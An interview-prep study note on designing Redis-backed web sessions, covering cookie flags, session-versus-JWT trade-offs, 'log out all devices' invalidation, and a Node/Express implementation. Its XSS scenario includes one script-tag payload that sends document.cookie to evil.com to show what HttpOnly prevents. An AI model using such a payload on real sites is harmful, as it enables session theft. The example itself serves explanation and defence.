# Session store design — Redis as session store + invalidation

## Source / Origin
- Industry-standard pattern; appears in every "design login" or "design auth" interview.
- Express-session, Spring Session, Django, Rails — all support Redis as the canonical backing store.
- `backend-data-prep/caching/01-caching-strategies.md` — "Session caching" section.
- Classic prompt: *"Replace your in-memory session store with Redis. Now design invalidation — what happens when a user changes their password?"*

## Why this question matters in interviews
Session storage is **the most common Redis use case** after general-purpose caching. The interviewer is testing whether you can:

1. **Distinguish a session cookie from a session id from session data** — three different things, easy to muddle.
2. **Decide between server-side sessions and stateless JWTs** — both valid, different tradeoffs.
3. **Design invalidation correctly** — the "log out from all devices" feature exposes whether you actually understood the model.
4. **Handle session expiry, refresh, and rotation** — TTL is the easy part; rotation prevents token theft replay.

This is the rare interview question where "I would use a library" is fine as the *first* sentence — the interviewer wants to hear that you know `express-session` / `connect-redis` exists — but you must follow up with the substantive design choices the library doesn't make for you.

## Concepts involved

### Syntax to lock in

```
On login:
  session_id = random(16+ bytes, cryptographic RNG)
  redis.SET("sess:" + session_id, JSON.stringify({
    user_id, csrf_token, last_activity, ip, ua_hash, ...
  }), EX=3600)
  set cookie "sid=<session_id>; HttpOnly; Secure; SameSite=Lax"

On request:
  session_id = req.cookies.sid
  payload = redis.GET("sess:" + session_id)
  if !payload: reject (401)
  validate (ip, ua, csrf if applicable)
  refresh TTL: redis.EXPIRE("sess:" + session_id, 3600)
  attach to req.user

On logout:
  redis.DEL("sess:" + session_id)
  clear cookie

On password change / "log out all devices":
  // option A: O(N) — iterate user's sessions
  redis.SREM("user_sessions:" + user_id, ...all_ids); redis.DEL(...all keys)
  // option B: O(1) — bump a per-user generation counter; reject sessions older than counter
```

### Edge cases / interview traps

1. **`session_id` must be cryptographically random.** Don't use `Math.random()`; use `crypto.randomBytes(32)`. 128+ bits of entropy.
2. **Cookies need `HttpOnly` + `Secure` + `SameSite`.** Otherwise XSS reads them, network sniffers steal them, or CSRF rides them.
3. **TTL vs sliding TTL.** TTL only = session dies at exactly `created_at + TTL`. Sliding TTL = each request refreshes TTL. Most apps want sliding; explicitly call out.
4. **"Log out from all devices" needs a strategy.** Either index sessions per user (`user_sessions:<uid>` = SET of session_ids) or use a per-user generation counter (`user_gen:<uid>` = INCR on password change; sessions carry the generation at creation).
5. **CSRF protection** — session data stores a CSRF token; mutating requests include it as a header; server verifies. Sessions don't fix CSRF automatically.
6. **Session fixation** — rotate the session_id on privilege escalation (e.g., login). `DEL` old, `SET` new.
7. **Redis persistence config** — if Redis is the only session store, AOF (append-only file) is mandatory. Otherwise every restart logs everyone out.
8. **Multi-region / clustering** — Redis Cluster works; replicated session reads from a replica is fine; writes go to primary.

## Mental Model

### Cookie → session_id → session payload

```
       Browser cookie:          Redis key:                Redis value:
       ┌──────────────┐         ┌─────────────────┐       ┌─────────────────┐
       │ sid=abc...123│ ──────► │ sess:abc...123  │ ────► │ {user_id: 42,   │
       │ HttpOnly     │         │ TTL: 3600s      │       │  csrf: ...,     │
       │ Secure       │         │                 │       │  ip: 1.2.3.4,   │
       │ SameSite=Lax │         │                 │       │  created: ...}  │
       └──────────────┘         └─────────────────┘       └─────────────────┘

3 layers:
  1. Cookie holds the opaque session id (never the data itself).
  2. Key indexes the session in the store.
  3. Value is the session payload (user_id, flags, last_activity).
```

### Session vs JWT comparison

```
SERVER-SIDE SESSION (Redis)
  Cookie:  opaque id (e.g., 32 bytes random base64url)
  Storage: Redis key → JSON payload
  Validate: lookup id in Redis (O(1) network)
  Revoke: redis.DEL — instant.
  Pros:    instant revocation, can store arbitrary data, small cookie.
  Cons:    every request hits Redis.

STATELESS JWT
  Cookie:  signed JWT containing claims (user_id, exp, roles)
  Storage: none (verify signature)
  Validate: verify signature locally.
  Revoke: HARD — must maintain a deny-list or rely on short TTL.
  Pros:    no Redis dependency, scales horizontally trivially.
  Cons:    revocation problem; bigger cookies; rotation pain.

Hybrid (common):
  Short-lived JWT access token + long-lived refresh token in Redis.
  Access token: 15min; revocation acceptable.
  Refresh token: 30 days; revocable via Redis DEL.
```

### Invalidation strategies — picture

```
Strategy A: Indexed user sessions
  redis.SADD user_sessions:42 sess1 sess2 sess3
  Logout all: SMEMBERS, DEL each session, DEL the set.
  Storage: O(N) per user. Atomic via pipeline or Lua.

Strategy B: Generation counter
  redis.SET user_gen:42 1   (incremented on password change)
  At login, store user_gen in session payload.
  On each request, compare session.gen to current user_gen:42.
  If session.gen < current gen → reject (forced logout).
  Storage: O(1) per user. Lazy invalidation.

Strategy C: Hybrid
  Indexed set for inspect/admin tasks ("show user's active sessions") + generation counter for revocation efficiency.
```

## Why interviewers care

- Sessions are **everywhere**; getting them wrong is a security incident.
- The session-vs-JWT decision is **the canonical auth-design tradeoff**.
- Invalidation design tests whether you've **actually shipped a "log out all devices" feature**.
- Cookie security flags (`HttpOnly`, `Secure`, `SameSite`) are **easy to forget and high-impact**.

## Common beginner confusion

- *"JWT replaces sessions."* JWT replaces session lookup; you still have a session — it's just self-describing.
- *"`SameSite=Lax` is enough for CSRF."* It's *most of the way* for top-level navigations but doesn't protect every flow. Pair with CSRF tokens for mutating requests.
- *"`Math.random()` is fine for session ids."* No. Predictable. Use cryptographic RNG.
- *"Session expiry = TTL."* Two semantics: fixed (always die at `created+T`) vs sliding (each request renews). Pick.
- *"Revoking a JWT is impossible."* Possible but requires a denylist or short TTL. The point is it isn't *automatic*.

## Brute force approach

In-memory session map in the app process. Works for a single instance. Fails the moment you have two app servers behind a load balancer — sessions land on different machines; logins forgotten. The reason Redis sessions exist.

Database table for sessions. Works but is slow (every request is a DB round trip). Redis is the default.

## Optimal approach

1. **Redis as the session store**, keyed by `sess:<session_id>`.
2. **Sliding TTL** for most use cases; refresh on each request.
3. **Cookie carries the opaque id**, never the data.
4. **`HttpOnly`, `Secure`, `SameSite=Lax`** flags mandatory.
5. **Indexed user→sessions set** for "log out all devices".
6. **Generation counter** for password-change revocation (fast, O(1)).
7. **Rotate session_id** on login and privilege change.
8. **AOF persistence** in Redis if it's the only store.

## Solution (Node + Express + Redis)

### Direct implementation

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const Redis = require('ioredis');
const crypto = require('crypto');

const redis = new Redis();
const app = express();
app.use(cookieParser());

const SESSION_TTL = 3600;       // seconds
const COOKIE_NAME = 'sid';

function newSessionId() {
  return crypto.randomBytes(32).toString('base64url');
}

// Login
app.post('/login', async (req, res) => {
  const user = await authenticate(req.body.email, req.body.password);
  if (!user) return res.status(401).send();
  const sid = newSessionId();
  const session = {
    user_id: user.id,
    gen: await redis.get(`user_gen:${user.id}`) || '0',
    csrf: crypto.randomBytes(16).toString('base64url'),
    created_at: Date.now(),
    last_activity: Date.now(),
    ip: req.ip,
    ua_hash: hashUA(req.get('user-agent')),
  };
  const tx = redis.multi();
  tx.set(`sess:${sid}`, JSON.stringify(session), 'EX', SESSION_TTL);
  tx.sadd(`user_sessions:${user.id}`, sid);
  tx.expire(`user_sessions:${user.id}`, 86400 * 30);
  await tx.exec();
  res.cookie(COOKIE_NAME, sid, {
    httpOnly: true, secure: true, sameSite: 'lax', maxAge: SESSION_TTL * 1000,
  });
  res.json({ csrf: session.csrf });
});

// Middleware
async function requireSession(req, res, next) {
  const sid = req.cookies[COOKIE_NAME];
  if (!sid) return res.status(401).send();
  const raw = await redis.get(`sess:${sid}`);
  if (!raw) return res.status(401).send();
  const session = JSON.parse(raw);

  // Generation check (forces logout if user_gen was bumped)
  const currentGen = await redis.get(`user_gen:${session.user_id}`) || '0';
  if (session.gen !== currentGen) {
    await redis.del(`sess:${sid}`);
    return res.status(401).send();
  }

  // Sliding TTL
  session.last_activity = Date.now();
  await redis.set(`sess:${sid}`, JSON.stringify(session), 'EX', SESSION_TTL);
  req.session = session;
  req.sid = sid;
  next();
}

// CSRF check on mutating requests
function requireCSRF(req, res, next) {
  if (req.headers['x-csrf-token'] !== req.session.csrf) {
    return res.status(403).send();
  }
  next();
}

// Logout
app.post('/logout', requireSession, async (req, res) => {
  const tx = redis.multi();
  tx.del(`sess:${req.sid}`);
  tx.srem(`user_sessions:${req.session.user_id}`, req.sid);
  await tx.exec();
  res.clearCookie(COOKIE_NAME);
  res.status(204).send();
});

// Log out all devices (password change, "sign out everywhere")
app.post('/logout-all', requireSession, async (req, res) => {
  await redis.incr(`user_gen:${req.session.user_id}`);
  // existing sessions will fail the gen check on their next request
  // also delete them eagerly if we want immediate effect
  const sids = await redis.smembers(`user_sessions:${req.session.user_id}`);
  if (sids.length) await redis.del(...sids.map(s => `sess:${s}`));
  await redis.del(`user_sessions:${req.session.user_id}`);
  res.status(204).send();
});

// Privilege rotation — generate new session_id on login (already done above) and on role change
async function rotateSession(req) {
  const newSid = newSessionId();
  const tx = redis.multi();
  tx.rename(`sess:${req.sid}`, `sess:${newSid}`);
  tx.srem(`user_sessions:${req.session.user_id}`, req.sid);
  tx.sadd(`user_sessions:${req.session.user_id}`, newSid);
  await tx.exec();
  req.sid = newSid;
}
```

### Using `connect-redis` (recommended in real code)

```javascript
const session = require('express-session');
const RedisStore = require('connect-redis').default;
app.use(session({
  store: new RedisStore({ client: redis, prefix: 'sess:' }),
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: { httpOnly: true, secure: true, sameSite: 'lax', maxAge: 3600_000 },
  rolling: true,  // sliding TTL
}));
```

Library handles cookie + Redis plumbing; you focus on invalidation policy.

## Step-by-step dry run

**Scenario: user changes password, expects all other sessions revoked.**

```
Initial state:
  user_sessions:42 = { sid_a, sid_b, sid_c }   (laptop, phone, tablet)
  sess:sid_a       = { user_id: 42, gen: '0', ... }
  sess:sid_b       = { user_id: 42, gen: '0', ... }
  sess:sid_c       = { user_id: 42, gen: '0', ... }
  user_gen:42      = '0'

User on laptop (sid_a) changes password. Application code:
  POST /change-password
  → verify current password
  → update DB
  → INCR user_gen:42  → '1'
  → rotate sid_a:     new sid_a' with gen: '1'

Now laptop's session has gen=1 (matches user_gen=1) → still valid.
Phone (sid_b)  has gen=0, user_gen=1 → next request: GEN MISMATCH → 401.
Tablet (sid_c) similarly → next request: 401.

Lazy revocation: O(1) write, O(1) check per request.
Eager revocation: optionally DEL sid_b and sid_c immediately to free Redis memory.
```

**Scenario: session expiry with sliding TTL.**

```
t=0:00  login. sess:abc set with TTL=3600.
t=0:30  user makes request. Middleware refreshes TTL → TTL reset to 3600.
t=1:00  user makes request. TTL reset.
t=1:00 → user idle.
t=2:00  TTL reached, Redis removes key.
t=2:30  user clicks something. Middleware: GET → nil → 401. User redirected to login.
```

**Scenario: session theft via XSS — what HttpOnly buys you.**

```
Without HttpOnly:
  Attacker injects <script>fetch('//evil.com?c='+document.cookie)</script>
  Stolen session_id sent to evil.com → attacker uses it from their machine.
  Mitigation: HttpOnly. document.cookie can't read it.

What HttpOnly doesn't protect:
  CSRF — attacker can still cause the browser to send the cookie.
  Need CSRF tokens or SameSite=Strict.
```

## How to think aloud in the interview

> "Three layers to keep distinct: the cookie holds an opaque session_id; the session_id keys a Redis entry; the Redis value is the session payload. The cookie never holds the payload directly — much smaller, more secure.
>
> Cookie config: `HttpOnly` prevents XSS theft, `Secure` prevents transit sniffing, `SameSite=Lax` prevents most CSRF. Session_id from `crypto.randomBytes(32)`, base64url-encoded — 256 bits of entropy, predictable id is the most common attack.
>
> Redis store: `sess:<id>` → JSON payload with user_id, csrf token, last_activity, ip, ua hash. TTL of an hour; sliding by re-`SET` on each request.
>
> Now the interesting part — invalidation. Logout is simple: `DEL`. Log-out-all-devices needs a strategy. Two patterns: (a) maintain `user_sessions:<uid>` as a Set of session_ids and `DEL` them all; (b) a generation counter `user_gen:<uid>`, stored in each session at creation, compared on each request. (b) is O(1) and lazy; (a) is eager but lets you 'show active sessions' UI.
>
> I'd use both: generation counter for fast revocation, indexed set for the user-facing 'devices logged in' page.
>
> Rotate the session_id on login (prevents session fixation) and on privilege change. CSRF tokens stored in the session, checked on mutating requests.
>
> JWT alternative: stateless, faster (no Redis hit), but revocation is awkward — you need a deny-list or short TTL with a refresh token in Redis anyway. Most real systems are hybrid: short JWT access token + long refresh token in Redis."

## Important takeaways

- **Cookie holds opaque id; Redis holds payload.** Never put payload in the cookie.
- **`HttpOnly` + `Secure` + `SameSite=Lax`** are minimum cookie flags.
- **`crypto.randomBytes(32)`** for session_id; not `Math.random()`.
- **Sliding TTL** is what most apps actually want; refresh on each request.
- **Generation counter** for fast "log out all" — O(1) write.
- **Indexed user→sessions set** for UI / eager revocation.
- **Rotate session_id** on login + privilege change.
- **CSRF tokens** still required even with `SameSite=Lax` for mutating requests.
- **AOF persistence** if Redis is the only store.
- **JWT vs session** — hybrid (short JWT + Redis refresh token) is the modern default.

## Variants

1. **Hybrid JWT + refresh token** — short-lived access JWT (15 min), long-lived refresh token in Redis (revocable).
2. **Multi-region session** — Redis Cluster + cross-region replication; eventual consistency is fine for sessions.
3. **Sticky sessions vs shared store** — sticky = load balancer pins user to one app instance. Shared store removes the need.
4. **Device fingerprinting** — store `ua_hash`, `ip` in session; warn on mismatch.
5. **Step-up auth** — sensitive operations rotate session_id + require fresh auth (e.g., re-enter password to change email).
6. **Session migration on schema change** — when adding a field, version the session; reject old-version sessions on next request.
7. **Per-tenant session store** — multi-tenant SaaS isolates per-tenant Redis databases.

## Revision notes

> **session store — 60 second recap**
> - **Cookie → session_id (opaque) → Redis key `sess:<id>` → JSON payload.**
> - **`HttpOnly`, `Secure`, `SameSite=Lax`** cookie flags mandatory.
> - **`crypto.randomBytes(32)`** for session_id.
> - **Sliding TTL** by re-`SET` on each request.
> - **Generation counter** `user_gen:<uid>` for fast "log out all".
> - **Indexed set** `user_sessions:<uid>` for active-devices UI.
> - **Rotate session_id** on login + privilege change.
> - **CSRF tokens** stored in session, checked on mutating requests.
> - **Hybrid JWT + Redis refresh token** is the modern default.
> - **AOF persistence** if Redis is the only store.
